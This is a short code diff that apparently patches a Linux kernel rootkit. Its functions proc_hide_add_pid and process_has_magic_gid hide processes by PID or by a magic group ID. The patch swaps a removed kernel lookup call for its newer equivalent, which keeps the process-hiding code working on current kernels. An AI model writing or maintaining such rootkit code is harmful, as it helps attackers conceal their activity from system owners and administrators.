@@ -217,7 +217,7 @@ int proc_hide_add_pid(pid_t pid)
   int i;
 
   rcu_read_lock();
-  task = find_task_by_vpid(pid);
+  task = pid_task(find_vpid(pid), PIDTYPE_PID);
   if (!task) {
     rcu_read_unlock();
     return -ESRCH;
@@ -262,7 +262,7 @@ static bool process_has_magic_gid(const char *name) {
     return hide;
 
   rcu_read_lock();
-  task = find_task_by_vpid(pid);
+  task = pid_task(find_vpid(pid), PIDTYPE_PID);
   if (!task) {
     rcu_read_unlock();
     return false;
